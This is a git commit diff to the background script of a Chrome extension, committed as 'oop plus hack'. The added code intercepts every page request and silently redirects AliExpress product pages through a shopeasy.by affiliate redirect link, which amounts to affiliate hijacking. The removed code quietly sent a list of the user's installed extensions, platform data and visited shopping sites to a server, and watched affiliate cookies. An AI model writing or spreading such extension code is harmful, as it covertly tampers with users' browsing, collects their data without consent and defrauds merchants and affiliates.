86aa4b6c7d9c0c8094aedc5e642f31fc520a11c7
Admin <admin@Mac-Admin.local>
2017-08-08 06:36:18 +0300

    oop plus hack

--- bg.js
+++ bg.js
@@ -1,109 +1,84 @@
-function getInfo(){
-  return new Promise(function(resolve, reject){
-    chrome.runtime.getPlatformInfo(function(info){
-      resolve(info);
-    })
-  })
+function autoactivateClass() {
+	var self = this;
+
+	this.auto_activate_moments = {};
+
+	this.setMoment = function(domain, moment) {
+		self.auto_activate_moments[domain] = moment;
+	}
+
+	this.getMoment = function(domain) {
+		var rv = false;
+		if (domain in self.auto_activate_moments) {
+			rv = self.auto_activate_moments[domain];
+		}
+		return rv;
+	}
+
+	this.resetMoments = function() {
+		self.auto_activate_moments = {};
+	}
 }
 
-function getExt(){
-  return new Promise(function(resolve, reject){
-    chrome.management.getAll(function(ext){
-      let itemObj = {};
-      ext.forEach(function(item){
-        itemObj[item.shortName] = item.id
-      })
-      resolve(itemObj)
-    });
-  });
-}
+function JsInject() {
 
-function getVersion(){ // May be futher update
-  return window.navigator.userAgent;
-}
+  var self = this;
 
-chrome.runtime.onInstalled.addListener(function(details){
-  if (details.reason == "install"){
-    Promise.all([getInfo(), getExt()])
-        .then(function(allData) {
-          console.log(allData); //Debug
-          fetch('http://localhost:3000/ext',{
-            method: 'post',
-            headers: {
-              'Accept': 'application/json, text/plain, */*',
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({data:allData})
-          })
-          .then(function(response){
-            console.log(response); //Debug
-          })
-          .catch(function(err){
-            console.log('Failed ',err);
-          });
-    });
+  //this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /(^http(.):\/\/www\.ozon\.ru)(.*?)/g];
+  this.deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/';
+  this.reg      = /^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g;
+  this.filter   = {urls: ["<all_urls>"], types:["main_frame"]};
+  this.opt_extraInfoSpec = ["blocking"];
+  this.autoactivateObj = new autoactivateClass();
+
+  _init();
+
+  function _init(){
+    chrome.runtime.onInstalled.addListener(whenInstalled);
+    chrome.cookies.onChanged.addListener(cookieChanges);
+    chrome.webRequest.onBeforeRequest.addListener(beforeRequest, self.filter, self.opt_extraInfoSpec);
   }
-});
 
-//const deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/' //Beta
-const deepLink = 'http://shopeasy.by/redirect/cpa/o/ou5s9n6tefplqafc1x0mef29smqnwywq/'; //DEBUG
-
-function madeReq(){
-  return new Promise(function(resolve, reject){
-    chrome.webRequest.onBeforeRequest.addListener(function(e){
-     if (urlMatch(e.url)){
-        const encode = encodeURIComponent(urlMatch(e.url));
-        const composed = compose(deepLink, encode)
-        console.log(e);//Debug
-        resolve(composed)
-      }
-    }, {urls: ["<all_urls>"], types: ['main_frame', 'sub_frame']},[]);
-  })
-}
-
-madeReq().then(function(comp){
-  console.log(comp);//Debug
-  chrome.tabs.update(undefined, {url:comp});
-}, function(err){
-  console.log(err);//Debug
-});
-
-function statUrl(url){
-  let urlMatch = [/aliexpress/g, /ozon/g, /asos/g, /banggod/g, /gearbest/g
-    , /wildberries/g, /mvideo/g, /litres/g, /aviasales/g, /hotellook/g, /tinkoff/g
-    , /e96/g, /sammydress/g, /svyaznoy/g, /booking/g, /dresslily/g, /mamsy/g, /tutu/g, /ostin/g];
-    urlMatch.forEach(function(item, i){
-      if (item.test(url)){
-        fetch('http://localhost:3000/ext',{
-          method: 'post',
-          headers: {
-            'Accept': 'application/json, text/plain, */*',
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({url:item.toString()}) // TOdo
-        })
-        .then(function(response){
-          console.log(response); //Debug
-        })
-        .catch(function(err){
-          console.log('Failed ',err);
-        });
-      }
-    })
-}
-statUrl('http://www.ru.litres.ey/zap/catalog');
-chrome.cookies.onChanged.addListener(function(changeInfo){ //for test
-  //console.log(changeInfo.cookie);
-  if (changeInfo.cookie.domain == "shopeasy.by"){
-    console.log(changeInfo.cookie);
+  function cookieChanges(info){
+    //console.log(info.cookie.domain);
+    if (info.cookie.domain === 'shopeasy.by'){
+      console.log(info.cookie.domain);
+    }
   }
-});
 
-function urlMatch(url){
-  const reg = /^http(.*?)aliexpress(.*?)item(.*?html)/g
-  return reg.test(url)?url.match(reg)[0]:false
+  function beforeRequest(req){
+    re = {cancel:false};
+
+    if (req.frameId == 0 && req.method == "GET"){
+      let link = _urlMatch(req.url);
+      if (link != null) {
+        //console.log(link);
+        var moment = self.autoactivateObj.getMoment(link);
+        console.log(moment);
+        if (moment + 720000 < Date.now()){
+          self.autoactivateObj.setMoment(link, Date.now());
+          let partner = self.deepLink +'?to='+ encodeURIComponent(link);
+          console.log(partner);
+          chrome.tabs.update(req.tabId, {url:partner});
+        }
+      }
+    }
+    return re;
+  }
+
+  function whenInstalled(details){
+    if (details.reason === 'install'){
+      console.log('first install');
+    }
+    else {
+      console.log(details.reason);
+    }
+  }
+
+  function _urlMatch(url){
+    return self.reg.test(url) ? url.match(self.reg)[0] : null;
+  }
+
 }
 
-function compose(first, encode){
-  return first+'?to='+encode;
-}
+var objInject = new JsInject();
